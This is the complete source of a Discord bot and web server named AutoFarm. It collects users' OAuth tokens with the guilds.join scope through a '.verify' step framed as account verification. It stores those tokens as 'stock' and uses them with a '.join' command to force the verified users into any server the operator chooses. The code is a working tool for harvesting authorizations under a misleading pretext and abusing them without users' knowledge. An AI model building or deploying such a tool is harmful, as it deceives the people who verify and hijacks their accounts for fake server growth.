const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
const express = require('express');
const fetch = require('node-fetch');
require('dotenv').config();

// --- Express Web Server Setup ---
const app = express();
const PORT = process.env.PORT || 3000;

// Token Storage Database (In-Memory)
const tokenDatabase = []; 

// Default Bot Prefix
let currentPrefix = '.';

let discordClient = null;

app.get('/auth/callback', async (req, res) => {
    const code = req.query.code;
    if (!code) return res.status(400).send('No authorization code provided.');

    try {
        const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
            method: 'POST',
            body: new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: process.env.REDIRECT_URI,
            }),
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });

        const oauthData = await tokenResponse.json();
        if (oauthData.access_token) {
            tokenDatabase.push({
                access_token: oauthData.access_token,
                refresh_token: oauthData.refresh_token,
                expires_at: Date.now() + (oauthData.expires_in * 1000)
            });

            console.log(`[AUTORESTOCK] New account verified! Total AutoFarm Stock: ${tokenDatabase.length}`);

            // Send Autorestock notification to Discord channel if configured
            if (discordClient && process.env.LOG_CHANNEL_ID) {
                try {
                    const logChannel = await discordClient.channels.fetch(process.env.LOG_CHANNEL_ID);
                    if (logChannel) {
                        const restockEmbed = new EmbedBuilder()
                            .setTitle('⚡ AutoFarm Restock Alert')
                            .setDescription(`A new account just verified!\n\n**Total Stock Available:** \`${tokenDatabase.length}\` accounts`)
                            .setColor(0x00FF00)
                            .setTimestamp();
                        logChannel.send({ embeds: [restockEmbed] });
                    }
                } catch (logErr) {
                    console.error('Failed to send restock log to Discord:', logErr);
                }
            }

            res.send(`
                <html>
                    <body style="background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
                        <h1>Authorized</h1>
                        <p>Account linked. You can close this window.</p>
                    </body>
                </html>
            `);
        } else {
            res.status(400).send('Authorization failed.');
        }
    } catch (error) {
        console.error(error);
        res.status(500).send('Internal Server Error');
    }
});

app.listen(PORT, () => console.log(`AutoFarm Web server running on port ${PORT}`));

// --- Discord Bot Setup ---
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

discordClient = client;

client.once('ready', () => {
    console.log(`AutoFarm logged in as ${client.user.tag}! Current prefix: '${currentPrefix}'`);
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.startsWith(currentPrefix)) return;

    const args = message.content.slice(currentPrefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // 1. .verify Command
    if (command === 'verify') {
        const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=guilds.join`;

        const embed = new EmbedBuilder()
            .setTitle('Account Verification')
            .setDescription('Click the button below to authorize the bot (scope: guilds.join).')
            .setColor(0x00FF00)
            .setFooter({ text: 'AutoFarm Utility' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel('-> Verify')
                .setStyle(ButtonStyle.Link)
                .setURL(oauthUrl)
        );

        return message.reply({ embeds: [embed], components: [row] });
    }

    // 2. .prefix <new_prefix> Command (Allows changing prefix on the fly)
    if (command === 'prefix') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply('❌ You need Administrator permissions to change the prefix.');
        }

        const newPrefix = args[0];
        if (!newPrefix) {
            return message.reply(`Current prefix is \`${currentPrefix}\`. Use \`${currentPrefix}prefix <new_prefix>\` to change it.`);
        }

        currentPrefix = newPrefix;
        return message.reply(`✅ Bot prefix updated to: \`${currentPrefix}\``);
    }

    // 3. .join <Server ID> Command
    if (command === 'join') {
        const targetGuildId = args[0];

        if (!targetGuildId) {
            return message.reply(`Please provide a target Server ID: \`${currentPrefix}join <server_id>\``);
        }

        if (tokenDatabase.length === 0) {
            return message.reply('No verified accounts available in the database yet.');
        }

        // Restricted role check (-1561435531462844587)
        const restrictedRoleId = '-1561435531462844587';
        const hasRestrictedRole = message.member.roles.cache.has(restrictedRoleId);

        let tokensToUse = tokenDatabase;
        if (hasRestrictedRole) {
            // Limits community role users to 2 joining accounts
            const limit = Math.min(2, tokenDatabase.length);
            tokensToUse = tokenDatabase.slice(0, limit);
            message.channel.send(`⚠️ Restricted role detected. Adding a maximum of ${limit} accounts to server ID \`${targetGuildId}\`.`);
        }

        await message.reply(`AutoFarm attempting to add ${tokensToUse.length} accounts to server ID \`${targetGuildId}\`...`);

        let successCount = 0;

        for (const tokenData of tokensToUse) {
            try {
                // Get Discord User ID
                const userRes = await fetch('https://discord.com/api/users/@me', {
                    headers: { authorization: `Bearer ${tokenData.access_token}` }
                });
                const userData = await userRes.json();

                if (userData.id) {
                    // Force join via Discord API
                    const joinRes = await fetch(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${userData.id}`, {
                        method: 'PUT',
                        headers: {
                            Authorization: `Bot ${process.env.DISCORD_TOKEN}`,
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ access_token: tokenData.access_token })
                    });

                    if (joinRes.ok || joinRes.status === 204) {
                        successCount++;
                    }
                }
            } catch (err) {
                console.error('Failed to add user:', err);
            }
        }

        return message.channel.send(`AutoFarm successfully added **${successCount}** out of **${tokensToUse.length}** accounts to the server.`);
    }
});

client.login(process.env.DISCORD_TOKEN);
